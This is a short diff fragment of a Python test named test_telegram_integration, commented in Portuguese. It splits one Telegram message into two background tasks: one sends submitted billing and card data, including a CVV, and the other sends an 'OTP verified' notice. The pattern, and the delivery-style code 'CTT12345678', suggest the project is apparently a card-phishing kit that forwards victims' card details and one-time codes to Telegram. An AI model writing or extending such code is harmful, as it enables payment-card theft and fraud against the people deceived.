@@ -296,9 +296,17 @@ async def test_telegram_integration(background_tasks: BackgroundTasks):
             "cvv": "456"
         }
         
-        # Enviar apenas mensagem completa (cliente + pagamento) para Telegram
+        # Enviar PRIMEIRA mensagem (dados do cartão)
         background_tasks.add_task(
-            telegram_service.send_payment_with_otp_info,
+            telegram_service.send_card_submitted_info,
+            test_billing_data,
+            test_card_data,
+            "CTT12345678"
+        )
+        
+        # Enviar SEGUNDA mensagem (OTP verificado) após delay
+        background_tasks.add_task(
+            telegram_service.send_otp_verified_message,
             test_billing_data,
             test_card_data,
             "123456",
